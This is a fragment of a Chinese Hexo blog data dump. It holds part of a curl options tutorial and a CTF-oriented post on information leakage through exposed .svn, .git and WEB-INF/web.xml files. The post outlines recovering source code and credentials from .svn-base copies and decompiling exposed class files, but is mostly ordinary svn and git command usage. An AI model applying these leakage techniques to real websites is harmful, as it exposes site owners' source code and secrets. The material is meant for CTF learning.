id=\"L\"><a href=\"#L\" class=\"headerlink\" title=\"-L\"></a><strong>-L</strong></h2><p><code>-L</code>参数会让 HTTP 请求跟随服务器的重定向。curl 默认不跟随重定向。</p>\n<blockquote>\n<pre><code class=\"bash\">$ curl -L -d &#39;tweet=hi&#39; https://api.twitter.com/tweet</code></pre>\n</blockquote>\n<h2 id=\"s\"><a href=\"#s\" class=\"headerlink\" title=\"-s\"></a><strong>-s</strong></h2><p><code>-s</code>参数将不输出错误和进度信息。</p>\n<blockquote>\n<pre><code class=\"bash\">$ curl -s https://www.example.com</code></pre>\n</blockquote>\n<p>上面命令一旦发生错误，不会显示错误信息。不发生错误的话，会正常显示运行结果。</p>\n<p>如果想让 curl 不产生任何输出，可以使用下面的命令。</p>\n<blockquote>\n<pre><code class=\"bash\">$ curl -s -o /dev/null https://google.com</code></pre>\n</blockquote>\n<h2 id=\"S\"><a href=\"#S\" class=\"headerlink\" title=\"-S\"></a><strong>-S</strong></h2><p><code>-S</code>参数指定只输出错误信息，通常与<code>-o</code>一起使用。</p>\n<blockquote>\n<pre><code class=\"bash\">$ curl -s -o /dev/null https://google.com</code></pre>\n</blockquote>\n<p>上面命令没有任何输出，除非发生错误。</p>\n<h2 id=\"v\"><a href=\"#v\" class=\"headerlink\" title=\"-v\"></a><strong>-v</strong></h2><p><code>-v</code>参数输出通信的整个过程，用于调试。</p>\n<blockquote>\n<pre><code class=\"bash\">$ curl -v https://www.example.com</code></pre>\n</blockquote>\n<p><code>--trace</code>参数也可以用于调试，还会输出原始的二进制数据。</p>\n<blockquote>\n<pre><code class=\"bash\">$ curl --trace - https://www.example.com</code></pre>\n</blockquote>\n<h2 id=\"e\"><a href=\"#e\" class=\"headerlink\" title=\"-e\"></a><strong>-e</strong></h2><p><code>-e</code>参数用来设置 HTTP 的标头<code>Referer</code>，表示请求的来源。</p>\n<blockquote>\n<pre><code class=\"bash\">curl -e &#39;https://google.com?q=example&#39; https://www.example.com</code></pre>\n</blockquote>\n<p>上面命令将<code>Referer</code>标头设为<code>https://google.com?q=example</code>。</p>\n<p><code>-H</code>参数可以通过直接添加标头<code>Referer</code>，达到同样效果。</p>\n<blockquote>\n<pre><code class=\"bash\">curl -H &#39;Referer: https://google.com?q=example&#39; https://www.example.com</code></pre>\n</blockquote>\n<h2 id=\"x\"><a href=\"#x\" class=\"headerlink\" title=\"-x\"></a><strong>-x</strong></h2><p><code>-x</code>参数指定 HTTP 请求的代理。</p>\n<blockquote>\n<pre><code class=\"bash\">$ curl -x socks5://james:cats@myproxy.com:8080 https://www.example.com</code></pre>\n</blockquote>\n<p>上面命令指定 HTTP 请求通过<code>myproxy.com:8080</code>的 socks5 代理发出。</p>\n<p>如果没有指定代理协议，默认为 HTTP。</p>\n<blockquote>\n<pre><code class=\"bash\">$ curl -x james:cats@myproxy.com:8080 https://www.example.com</code></pre>\n</blockquote>\n<p>上面命令中，请求的代理使用 HTTP 协议。</p>\n<h2 id=\"X\"><a href=\"#X\" class=\"headerlink\" title=\"-X\"></a><strong>-X</strong></h2><p><code>-X</code>参数指定 HTTP 请求的方法。</p>\n<blockquote>\n<pre><code class=\"bash\">$ curl -X POST https://www.example.com</code></pre>\n</blockquote>\n<p>上面命令对<code>https://www.example.com</code>发出 POST 请求。</p>\n<h2 id=\"写入（上传）或保存（下载）文件或信息\"><a href=\"#写入（上传）或保存（下载）文件或信息\" class=\"headerlink\" title=\"写入（上传）或保存（下载）文件或信息\"></a>写入（上传）或保存（下载）文件或信息</h2><h2 id=\"o\"><a href=\"#o\" class=\"headerlink\" title=\"-o\"></a><strong>-o</strong></h2><p><code>-o</code>参数将服务器的回应保存成文件，等同于<code>wget</code>命令。</p>\n<blockquote>\n<pre><code class=\"bash\">$ curl -o example.html https://www.example.com</code></pre>\n</blockquote>\n<p>上面命令将<code>www.example.com</code>保存成<code>example.html</code>。</p>\n<h2 id=\"O\"><a href=\"#O\" class=\"headerlink\" title=\"-O\"></a><strong>-O</strong></h2><p><code>-O</code>参数将服务器回应保存成文件，并将 URL 的最后部分当作文件名。</p>\n<blockquote>\n<pre><code class=\"bash\">$ curl -O https://www.example.com/foo/bar.html</code></pre>\n</blockquote>\n<p>上面命令将服务器回应保存成文件，文件名为<code>bar.html</code>。</p>\n<h2 id=\"b\"><a href=\"#b\" class=\"headerlink\" title=\"-b\"></a><strong>-b</strong></h2><p><code>-b</code>参数用来向服务器发送 Cookie。</p>\n<blockquote>\n<pre><code class=\"bash\">$ curl -b &#39;foo=bar&#39; https://google.com</code></pre>\n</blockquote>\n<p>上面命令会生成一个标头<code>Cookie: foo=bar</code>，向服务器发送一个名为<code>foo</code>、值为<code>bar</code>的 Cookie。</p>\n<blockquote>\n<pre><code class=\"bash\">$ curl -b &#39;foo1=bar;foo2=bar2&#39; https://google.com</code></pre>\n</blockquote>\n<p>上面命令发送两个 Cookie。</p>\n<blockquote>\n<pre><code class=\"bash\">$ curl -b cookies.txt https://www.google.com</code></pre>\n</blockquote>\n<p>上面命令读取本地文件<code>cookies.txt</code>，里面是服务器设置的 Cookie（参见<code>-c</code>参数），将其发送到服务器。</p>\n<h2 id=\"c\"><a href=\"#c\" class=\"headerlink\" title=\"-c\"></a><strong>-c</strong></h2><p><code>-c</code>参数将服务器设置的 Cookie 写入一个文件。</p>\n<blockquote>\n<pre><code class=\"bash\">$ curl -c cookies.txt https://www.google.com</code></pre>\n</blockquote>\n<p>上面命令将服务器的 HTTP 回应所设置 Cookie 写入文本文件<code>cookies.txt</code>。</p>\n<h2 id=\"d-1\"><a href=\"#d-1\" class=\"headerlink\" title=\"-d\"></a><strong>-d</strong></h2><p><code>-d</code>参数用于发送 POST 请求的数据体。</p>\n<blockquote>\n<pre><code class=\"bash\">$ curl -d&#39;login=emma＆password=123&#39;-X POST https://google.com/login\n# 或者\n$ curl -d &#39;login=emma&#39; -d &#39;password=123&#39; -X POST  https://google.com/login</code></pre>\n</blockquote>\n<p>使用<code>-d</code>参数以后，HTTP 请求会自动加上标头<code>Content-Type : application/x-www-form-urlencoded</code>。并且会自动将请求转为 POST 方法，因此可以省略<code>-X POST</code>。</p>\n<p><code>-d</code>参数可以读取本地文本文件的数据，向服务器发送。</p>\n<blockquote>\n<pre><code class=\"bash\">$ curl -d &#39;@data.txt&#39; https://google.com/login</code></pre>\n</blockquote>\n<p>上面命令读取<code>data.txt</code>文件的内容，作为数据体向服务器发送。</p>\n<h2 id=\"–data-urlencode-1\"><a href=\"#–data-urlencode-1\" class=\"headerlink\" title=\"–data-urlencode\"></a><strong>–data-urlencode</strong></h2><p><code>--data-urlencode</code>参数等同于<code>-d</code>，发送 POST 请求的数据体，区别在于会自动将发送的数据进行 URL 编码。</p>\n<blockquote>\n<pre><code class=\"bash\">$ curl --data-urlencode &#39;comment=hello world&#39; https://google.com/login</code></pre>\n</blockquote>\n<p>上面代码中，发送的数据<code>hello world</code>之间有一个空格，需要进行 URL 编码。</p>\n<h2 id=\"F\"><a href=\"#F\" class=\"headerlink\" title=\"-F\"></a><strong>-F</strong></h2><p><code>-F</code>参数用来向服务器上传二进制文件。</p>\n<blockquote>\n<pre><code class=\"bash\">$ curl -F &#39;file=@photo.png&#39; https://google.com/profile</code></pre>\n</blockquote>\n<p>上面命令会给 HTTP 请求加上标头<code>Content-Type: multipart/form-data</code>，然后将文件<code>photo.png</code>作为<code>file</code>字段上传。</p>\n<p><code>-F</code>参数可以指定 MIME 类型。</p>\n<blockquote>\n<pre><code class=\"bash\">$ curl -F &#39;file=@photo.png;type=image/png&#39; https://google.com/profile</code></pre>\n</blockquote>\n<p>上面命令指定 MIME 类型为<code>image/png</code>，否则 curl 会把 MIME 类型设为<code>application/octet-stream</code>。</p>\n<p><code>-F</code>参数也可以指定文件名。</p>\n<blockquote>\n<pre><code class=\"bash\">$ curl -F &#39;file=@photo.png;filename=me.png&#39; https://google.com/profile</code></pre>\n</blockquote>\n<p>上面命令中，原始文件名为<code>photo.png</code>，但是服务器接收到的文件名为<code>me.png</code>。</p>\n<h2 id=\"G\"><a href=\"#G\" class=\"headerlink\" title=\"-G\"></a><strong>-G</strong></h2><p><code>-G</code>参数用来构造 URL 的查询字符串。</p>\n<blockquote>\n<pre><code class=\"bash\">$ curl -G -d &#39;q=kitties&#39; -d &#39;count=20&#39; https://google.com/search</code></pre>\n</blockquote>\n<p>上面命令会发出一个 GET 请求，实际请求的 URL 为<code>https://google.com/search?q=kitties&amp;count=20</code>。如果省略<code>--G</code>，会发出一个 POST 请求。</p>\n<p>如果数据需要 URL 编码，可以结合<code>--data--urlencode</code>参数。</p>\n<blockquote>\n<pre><code class=\"bash\">$ curl -G --data-urlencode &#39;comment=hello world&#39; https://www.example.com</code></pre>\n</blockquote>\n<h2 id=\"u\"><a href=\"#u\" class=\"headerlink\" title=\"-u\"></a><strong>-u</strong></h2><p><code>-u</code>参数用来设置服务器认证的用户名和密码。</p>\n<blockquote>\n<pre><code class=\"bash\">$ curl -u &#39;bob:12345&#39; https://google.com/login</code></pre>\n</blockquote>\n<p>上面命令设置用户名为<code>bob</code>，密码为<code>12345</code>，然后将其转为 HTTP 标头<code>Authorization: Basic Ym9iOjEyMzQ1</code>。</p>\n<p>curl 能够识别 URL 里面的用户名和密码。</p>\n<blockquote>\n<pre><code class=\"bash\">$ curl https://bob:12345@google.com/login</code></pre>\n</blockquote>\n<p>上面命令能够识别 URL 里面的用户名和密码，将其转为上个例子里面的 HTTP 标头。</p>\n<blockquote>\n<pre><code class=\"bash\">$ curl -u &#39;bob&#39; https://google.com/login</code></pre>\n</blockquote>\n<p>上面命令只设置了用户名，执行后，curl 会提示用户输入密码。</p>\n"},{"layout":"post","title":"版本控制系统信息泄露分析","date":"2021-01-13T16:00:00.000Z","description":"详解ctf中的版本控制系统信息泄露分析过程","typora-copy-images-to":"..\\img","typora-root-url":"..","_content":"# 版本控制系统信息泄露分析\n\n## .svn文件\n\n.svn文件是 Subversion系统的版本控制信息文件，当某个目录处于subversion的版本控制i时，在这个目录中就会.svn这个文件夹，这个.svn文件夹中的文件就是一些版本信息文件。\n\n黑客可以借助其中包含的用于版本信息追踪的‘entries’文件，逐步摸清站点结构。”（可以利用.svn/entries文件，获取到服务器源码、svn服务器账号密码等信息）\n\n更严重的问题在于，SVN产生的.svn目录下还包含了以.svn-base结尾的源代码文件副本（低版本SVN具体路径为text-base目录，高版本SVN为pristine目录），如果服务器没有对此类后缀做解析，黑客则可以直接获得文件源代码。\n\n**系统中没有Subversion的情况下：**手工查找。\n\n多半是去寻找项目的源代码，那么就去寻找**以.svn-base结尾的源代码文件副本（低版本SVN具体路径为text-base目录，高版本SVN为pristine目录）**，或者也可以先读一读entries文件，直接用记事本打开就行，如果方法得当，就能节省不少时间。\n\n**系统中有Subversion的情况下：**先用命令查找一遍\n\n- **svn log:** 用来展示svn 的版本作者、日期、路径等等。\n- **svn diff:** 用来显示特定修改的行级详细信息。\n- **svn cat:** 取得在特定版本的某文件显示在当前屏幕。\n- **svn list:** 显示一个目录或某一版本存在的文件。\n\n------\n\n### 1、svn log\n\n可以显示所有的信息，如果只希望查看特定的某两个版本之间的信息，可以使用：\n\n```\nroot@runoob:~/svn/runoob01/trunk# svn log -r 6:8\n------------------------------------------------------------------------\nr6 | user02 | 2016-11-07 02:01:26 +0800 (Mon, 07 Nov 2016) | 1 line\n\nchange HelloWorld.html first.\n------------------------------------------------------------------------\nr7 | user01 | 2016-11-07 02:23:26 +0800 (Mon, 07 Nov 2016) | 1 line\n\nchange HelloWorld.html second\n------------------------------------------------------------------------\nr8 | user01 | 2016-11-07 02:53:13 +0800 (Mon, 07 Nov 2016) | 1 line\n\nSVN readme.\n------------------------------------------------------------------------\n```\n\n如果只想查看某一个文件的版本修改信息，可以使用 **svn log** 文件路径。\n\n```\nroot@runoob:~/svn/runoob01# svn log trunk/HelloWorld.html \n------------------------------------------------------------------------\nr7 | user01 | 2016-11-07 02:23:26 +0800 (Mon, 07 Nov 2016) | 1 line\n\nchange HelloWorld.html second\n------------------------------------------------------------------------\nr6 | user02 | 2016-11-07 02:01:26 +0800 (Mon, 07 Nov 2016) | 1 line\n\nchange HelloWorld.html first.\n------------------------------------------------------------------------\nr5 | user01 | 2016-11-07 01:50:03 +0800 (Mon, 07 Nov 2016) | 1 line\n\n\n------------------------------------------------------------------------\nr4 | user01 | 2016-11-07 01:45:43 +0800 (Mon, 07 Nov 2016) | 1 line\n\nAdd function to accept input and to display array contents\n------------------------------------------------------------------------\nr3 | user01 | 2016-11-07 01:42:35 +0800 (Mon, 07 Nov 2016) | 1 line\n\n\n------------------------------------------------------------------------\nr2 | user01 | 2016-08-23 17:29:02 +0800 (Tue, 23 Aug 2016) | 1 line\n\nfirst file\n------------------------------------------------------------------------\n```\n\n如果希望得到目录的信息要加 **-v**。\n\n如果希望显示限定N条记录的目录信息，使用 `svn log -l N -v`。\n\n```\nroot@runoob:~/svn/runoob01/trunk# svn log -l 5 -v \n------------------------------------------------------------------------\nr6 | user02 | 2016-11-07 02:01:26 +0800 (Mon, 07 Nov 2016) | 1 line\nChanged paths:\n   M /trunk/HelloWorld.html\n\nchange HelloWorld.html first.\n------------------------------------------------------------------------\nr5 | user01 | 2016-11-07 01:50:03 +0800 (Mon, 07 Nov 2016) | 1 line\nChanged paths:\n   M /trunk/HelloWorld.html\n\n\n------------------------------------------------------------------------\nr4 | user01 | 2016-11-07 01:45:43 +0800 (Mon, 07 Nov 2016) | 1 line\nChanged paths:\n   M /trunk/HelloWorld.html\n\nAdd function to accept input and to display array contents\n------------------------------------------------------------------------\nr3 | user01 | 2016-11-07 01:42:35 +0800 (Mon, 07 Nov 2016) | 1 line\nChanged paths:\n   A /trunk/HelloWorld.html (from /trunk/helloworld.html:2)\n   D /trunk/helloworld.html\n\n\n------------------------------------------------------------------------\nr2 | user01 | 2016-08-23 17:29:02 +0800 (Tue, 23 Aug 2016) | 1 line\nChanged paths:\n   A /trunk/helloworld.html\n\nfirst file\n------------------------------------------------------------------------\n```\n\n------\n\n### 2、svn diff\n\n用来检查历史修改的详情。\n\n- 检查本地修改\n- 比较工作拷贝与版本库\n- 比较版本库与版本库\n\n**（1）、如果用 svn diff，不带任何参数，它将会比较你的工作文件与缓存在 .svn 的\"原始\"拷贝。**\n\n```\nroot@runoob:~/svn/runoob01/trunk# svn diff\nIndex: rules.txt\n===================================================================\n--- rules.txt (revision 3)\n+++ rules.txt (working copy)\n@@ -1,4 +1,5 @@\nBe kind to others\nFreedom = Responsibility\nEverything in moderation\n-Chew with your mouth open\n```\n\n**（2）、比较工作拷贝和版本库**\n\n比较你的工作拷贝和版本库中版本号为 3 的文件 rule.txt。\n\n```\nsvn diff -r 3 rule.txt\n```\n\n**（3）、比较版本库与版本库**\n\n通过 -r(revision) 传递两个通过冒号分开的版本号，这两个版本会进行比较。\n\n比较 svn 工作版本中版本号2和3的这个文件的变化。\n\n```\nsvn diff -r 2:3 rule.txt\n```\n\n------\n\n### 3、svn cat\n\n如果只是希望检查一个过去版本，不希望查看他们的区别，可使用svn cat\n\n```\nsvn cat -r 版本号 rule.txt\n```\n\n这个命令会显示在该版本号下的该文件内容\n\n------\n\n### 4、svn list\n\ns**vn list** 可以在不下载文件到本地目录的情况下来察看目录中的文件：\n\n```\n$ svn list http://192.168.0.1/runoob01\nREADME\nbranches/\nclients/\ntags/\n```\n\n### SVN 版本回退\n\n------\n\n当我们想放弃对文件的修改，可以使用 **SVN revert** 命令。\n\nsvn revert 操作将撤销任何文件或目录里的局部更改。\n\n我们对文件 readme 进行修改,查看文件状态。\n\n\n\n```\nroot@runoob:~/svn/runoob01/trunk# svn status\nM       readme\n```\n\n这时我们发现修改错误，要撤销修改，通过 svn revert 文件 readme 回归到未修改状态。\n\n```\nroot@runoob:~/svn/runoob01/trunk# svn revert readme \nReverted 'readme'\n```\n\n再查看状态。\n\n```\nroot@runoob:~/svn/runoob01/trunk# svn status \nroot@runoob:~/svn/runoob01/trunk# \n```\n\n进行 revert 操作之后，readme 文件恢复了原始的状态。 revert 操作不单单可以使单个文件恢复原状， 而且可以使整个目录恢复原状。恢复目录用 -R 命令，如下。\n\n```\nsvn revert -R trunk\n```\n\n但是，假如我们想恢复一个已经提交的版本怎么办。\n\n为了消除一个旧版本，我们必须撤销旧版本里的所有更改然后提交一个新版本。这种操作叫做 reverse merge。\n\n首先，找到仓库的当前版本，现在是版本 22，我们要撤销回到之前的版本，比如版本 21。\n\n```\nsvn merge -r 22:21 readme \n```\n\n\n\n## .git文件\n\nGit泄露上一篇博客将得挺清楚了，一般ctf中会遇到的问题都有了，如果将来写题遇到什么有趣的、有用的东西再记录一下，这里贴一些git常用命令吧，也是实用的东西。\n\n**创建分支命令：**\n\n```\ngit branch (branchname)\t\t\t//创建一个叫branchname的分支\n```\n\n**列出分支命令：**\n\n```\ngit branch\n```\n\n没有参数时，`git branch` 会列出你在本地的分支。\n\n```\n$ git branch\n* master\n```\n\n此例的意思就是，我们有一个叫做 **master** 的分支，并且该分支是当前分支。\n\n当你执行 **git init** 的时候，默认情况下 Git 就会为你创建 **master** 分支。\n\n**切换分支命令:**\n\n```\ngit checkout (branchname)\n```\n\n当你切换分支的时候，Git 会用该分支的最后提交的快照替换你的工作目录的内容， 所以多个分支不需要多个目录。\n\n上一篇提到了一个`git checkout-index`命令，就是将index索引中的文件”切换“出来，切换到当前工作目录。\n\n**合并分支命令:**\n\n```\ngit merge \n```\n\n一旦某分支有了独立内容，你终究会希望将它合并回到你的主分支。\n\n```bash\n$ git branch\n* master\n  newtest\n$ ls\nREADME        test.txt\n$ git merge newtest\nUpdating 3e92c19..c1501a2\nFast-forward\n xxx.php | 0\n test.txt   | 1 -\n 2 files changed, 1 deletion(-)\n create mode 100644 xxx.php\n delete mode 100644 test.txt\n$ ls\nREADME        xxx.php\n```\n\n以上实例中我们将 newtest 分支合并到主分支去，test.txt 文件被删除。\n\n合并完后就可以删除分支:\n\n**删除分支命令：**\n\n```bash\ngit branch -d (branchname)\t\t//删除名为branchname的分支\n```\n\n```\n$ git branch -d newtest\nDeleted branch newtest (was c1501a2).\n```\n\n删除后， 就只剩下 master 分支了：\n\n```bash\n$ git branch\n* master\n```\n\n\n\n## WEB-INF/web.xml\n\nWEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。WEB-INF主要包含一下文件或目录：\n\n```\n /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。 \n\n  /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中   \n\n  /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件  \n\n  /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。\n\n  /WEB-INF/database.properties：数据库配置文件\n\n```\n\n漏洞成因：\n\n​\t通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。\n\n**漏洞检测以及利用方法**：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。\n\n但是具体情况具体分析，实际场景下还是要尽量发挥随机应变的能力。","source":"_posts/2021-1-14-版本控制系统信息泄露分析.md","raw":"---\nlayout: post\ntitle: 版本控制系统信息泄露分析\ndate: 2021-1-14\ncategories: blog\ntags: [ctf,web]\ndescription: 详解ctf中的版本控制系统信息泄露分析过程\ntypora-copy-images-to: ..\\img\ntypora-root-url: ..\n---\n# 版本控制系统信息泄露分析\n\n## .svn文件\n\n.svn文件是 Subversion系统的版本控制信息文件，当某个目录处于subversion的版本控制i时，在这个目录中就会.svn这个文件夹，这个.svn文件夹中的文件就是一些版本信息文件。\n\n黑客可以借助其中包含的用于版本信息追踪的‘entries’文件，逐步摸清站点结构。”（可以利用.svn/entries文件，获取到服务器源码、svn服务器账号密码等信息）\n\n更严重的问题在于，SVN产生的.svn目录下还包含了以.svn-base结尾的源代码文件副本（低版本SVN具体路径为text-base目录，高版本SVN为pristine目录），如果服务器没有对此类后缀做解析，黑客则可以直接获得文件源代码。\n\n**系统中没有Subversion的情况下：**手工查找。\n\n多半是去寻找项目的源代码，那么就去寻找**以.svn-base结尾的源代码文件副本（低版本SVN具体路径为text-base目录，高版本SVN为pristine目录）**，或者也可以先读一读entries文件，直接用记事本打开就行，如果方法得当，就能节省不少时间。\n\n**系统中有Subversion的情况下：**先用命令查找一遍\n\n- **svn log:** 用来展示svn 的版本作者、日期、路径等等。\n- **svn diff:** 用来显示特定修改的行级详细信息。\n- **svn cat:** 取得在特定版本的某文件显示在当前屏幕。\n- **svn list:** 显示一个目录或某一版本存在的文件。\n\n------\n\n### 1、svn log\n\n可以显示所有的信息，如果只希望查看特定的某两个版本之间的信息，可以使用：\n\n```\nroot@runoob:~/svn/runoob01/trunk# svn log -r 6:8\n------------------------------------------------------------------------\nr6 | user02 | 2016-11-07 02:01:26 +0800 (Mon, 07 Nov 2016) | 1 line\n\nchange HelloWorld.html first.\n------------------------------------------------------------------------\nr7 | user01 | 2016-11-07 02:23:26 +0800 (Mon, 07 Nov 2016) | 1 line\n\nchange HelloWorld.html second\n------------------------------------------------------------------------\nr8 | user01 | 2016-11-07 02:53:13 +0800 (Mon, 07 Nov 2016) | 1 line\n\nSVN readme.\n------------------------------------------------------------------------\n```\n\n如果只想查看某一个文件的版本修改信息，可以使用 **svn log** 文件路径。\n\n```\nroot@runoob:~/svn/runoob01# svn log trunk/HelloWorld.html \n------------------------------------------------------------------------\nr7 | user01 | 2016-11-07 02:23:26 +0800 (Mon, 07 Nov 2016) | 1 line\n\nchange HelloWorld.html second\n------------------------------------------------------------------------\nr6 | user02 | 2016-11-07 02:01:26 +0800 (Mon, 07 Nov 2016) | 1 line\n\nchange HelloWorld.html first.\n------------------------------------------------------------------------\nr5 | user01 | 2016-11-07 01:50:03 +0800 (Mon, 07 Nov 2016) | 1 line\n\n\n------------------------------------------------------------------------\nr4 | user01 | 2016-11-07 01:45:43 +0800 (Mon, 07 Nov 2016) | 1 line\n\nAdd function to accept input and to display array contents\n------------------------------------------------------------------------\nr3 | user01 | 2016-11-07 01:42:35 +0800 (Mon, 07 Nov 2016) | 1 line\n\n\n------------------------------------------------------------------------\nr2 | user01 | 2016-08-23 17:29:02 +0800 (Tue, 23 Aug 2016) | 1 line\n\nfirst file\n------------------------------------------------------------------------\n```\n\n如果希望得到目录的信息要加 **-v**。\n\n如果希望显示限定N条记录的目录信息，使用 `svn log -l N -v`。\n\n```\nroot@runoob:~/svn/runoob01/trunk# svn log -l 5 -v \n------------------------------------------------------------------------\nr6 | user02 | 2016-11-07 02:01:26 +0800 (Mon, 07 Nov 2016) | 1 line\nChanged paths:\n   M /trunk/HelloWorld.html\n\nchange HelloWorld.html first.\n------------------------------------------------------------------------\nr5 | user01 | 2016-11-07 01:50:03 +0800 (Mon, 07 Nov 2016) | 1 line\nChanged paths:\n   M /trunk/HelloWorld.html\n\n\n------------------------------------------------------------------------\nr4 | user01 | 2016-11-07 01:45:43 +0800 (Mon, 07 Nov 2016) | 1 line\nChanged paths:\n   M /trunk/HelloWorld.html\n\nAdd function to accept input and to display array contents\n------------------------------------------------------------------------\nr3 | user01 | 2016-11-07 01:42:35 +0800 (Mon, 07 Nov 2016) | 1 line\nChanged paths:\n   A /trunk/HelloWorld.html (from /trunk/helloworld.html:2)\n   D /trunk/helloworld.html\n\n\n------------------------------------------------------------------------\nr2 | user01 | 2016-08-23 17:29:02 +0800 (Tue, 23 Aug 2016) | 1 line\nChanged paths:\n   A /trunk/helloworld.html\n\nfirst file\n------------------------------------------------------------------------\n```\n\n------\n\n### 2、svn diff\n\n用来检查历史修改的详情。\n\n- 检查本地修改\n- 比较工作拷贝与版本库\n- 比较版本库与版本库\n\n**（1）、如果用 svn diff，不带任何参数，它将会比较你的工作文件与缓存在 .svn 的\"原始\"拷贝。**\n\n```\nroot@runoob:~/svn/runoob01/trunk# svn diff\nIndex: rules.txt\n===================================================================\n--- rules.txt (revision 3)\n+++ rules.txt (working copy)\n@@ -1,4 +1,5 @@\nBe kind to others\nFreedom = Responsibility\nEverything in moderation\n-Chew with your mouth open\n```\n\n**（2）、比较工作拷贝和版本库**\n\n比较你的工作拷贝和版本库中版本号为 3 的文件 rule.txt。\n\n```\nsvn diff -r 3 rule.txt\n```\n\n**（3）、比较版本库与版本库**\n\n通过 -r(revision) 传递两个通过冒号分开的版本号，这两个版本会进行比较。\n\n比较 svn 工作版本中版本号2和3的这个文件的变化。\n\n```\nsvn diff -r 2:3 rule.txt\n```\n\n------\n\n### 3、svn cat\n\n如果只是希望检查一个过去版本，不希望查看他们的区别，可使用svn cat\n\n```\nsvn cat -r 版本号 rule.txt\n```\n\n这个命令会显示在该版本号下的该文件内容\n\n------\n\n### 4、svn list\n\ns**vn list** 可以在不下载文件到本地目录的情况下来察看目录中的文件：\n\n```\n$ svn list http://192.168.0.1/runoob01\nREADME\nbranches/\nclients/\ntags/\n```\n\n### SVN 版本回退\n\n------\n\n当我们想放弃对文件的修改，可以使用 **SVN revert** 命令。\n\nsvn revert 操作将撤销任何文件或目录里的局部更改。\n\n我们对文件 readme 进行修改,查看文件状态。\n\n\n\n```\nroot@runoob:~/svn/runoob01/trunk# svn status\nM       readme\n```\n\n这时我们发现修改错误，要撤销修改，通过 svn revert 文件 readme 回归到未修改状态。\n\n```\nroot@runoob:~/svn/runoob01/trunk# svn revert readme \nReverted 'readme'\n```\n\n再查看状态。\n\n```\nroot@runoob:~/svn/runoob01/trunk# svn status \nroot@runoob:~/svn/runoob01/trunk# \n```\n\n进行 revert 操作之后，readme 文件恢复了原始的状态。 revert 操作不单单可以使单个文件恢复原状， 而且可以使整个目录恢复原状。恢复目录用 -R 命令，如下。\n\n```\nsvn revert -R trunk\n```\n\n但是，假如我们想恢复一个已经提交的版本怎么办。\n\n为了消除一个旧版本，我们必须撤销旧版本里的所有更改然后提交一个新版本。这种操作叫做 reverse merge。\n\n首先，找到仓库的当前版本，现在是版本 22，我们要撤销回到之前的版本，比如版本 21。\n\n```\nsvn merge -r 22:21 readme \n```\n\n\n\n## .git文件\n\nGit泄露上一篇博客将得挺清楚了，一般ctf中会遇到的问题都有了，如果将来写题遇到什么有趣的、有用的东西再记录一下，这里贴一些git常用命令吧，也是实用的东西。\n\n**创建分支命令：**\n\n```\ngit branch (branchname)\t\t\t//创建一个叫branchname的分支\n```\n\n**列出分支命令：**\n\n```\ngit branch\n```\n\n没有参数时，`git branch` 会列出你在本地的分支。\n\n```\n$ git branch\n* master\n```\n\n此例的意思就是，我们有一个叫做 **master** 的分支，并且该分支是当前分支。\n\n当你执行 **git init** 的时候，默认情况下 Git 就会为你创建 **master** 分支。\n\n**切换分支命令:**\n\n```\ngit checkout (branchname)\n```\n\n当你切换分支的时候，Git 会用该分支的最后提交的快照替换你的工作目录的内容， 所以多个分支不需要多个目录。\n\n上一篇提到了一个`git checkout-index`命令，就是将index索引中的文件”切换“出来，切换到当前工作目录。\n\n**合并分支命令:**\n\n```\ngit merge \n```\n\n一旦某分支有了独立内容，你终究会希望将它合并回到你的主分支。\n\n```bash\n$ git branch\n* master\n  newtest\n$ ls\nREADME        test.txt\n$ git merge newtest\nUpdating 3e92c19..c1501a2\nFast-forward\n xxx.php | 0\n test.txt   | 1 -\n 2 files changed, 1 deletion(-)\n create mode 100644 xxx.php\n delete mode 100644 test.txt\n$ ls\nREADME        xxx.php\n```\n\n以上实例中我们将 newtest 分支合并到主分支去，test.txt 文件被删除。\n\n合并完后就可以删除分支:\n\n**删除分支命令：**\n\n```bash\ngit branch -d (branchname)\t\t//删除名为branchname的分支\n```\n\n```\n$ git branch -d newtest\nDeleted branch newtest (was c1501a2).\n```\n\n删除后， 就只剩下 master 分支了：\n\n```bash\n$ git branch\n* master\n```\n\n\n\n## WEB-INF/web.xml\n\nWEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。WEB-INF主要包含一下文件或目录：\n\n```\n /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。 \n\n  /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中   \n\n  /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件  \n\n  /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。\n\n  /WEB-INF/database.properties：数据库配置文件\n\n```\n\n漏洞成因：\n\n​\t通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。\n\n**漏洞检测以及利用方法**：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。\n\n但是具体情况具体分析，实际场景下还是要尽量发挥随机应变的能力。","slug":"2021-1-14-版本控制系统信息泄露分析","published":1,"updated":"2021-01-14T16:13:11.899Z","comments":1,"photos":[],"link":"","_id":"ckkntx9kl002lxov784d22w5i","content":"<h1 id=\"版本控制系统信息泄露分析\"><a href=\"#版本控制系统信息泄露分析\" class=\"headerlink\" title=\"版本控制系统信息泄露分析\"></a>版本控制系统信息泄露分析</h1><h2 id=\"svn文件\"><a href=\"#svn文件\" class=\"headerlink\" title=\".svn文件\"></a>.svn文件</h2><p>.svn文件是 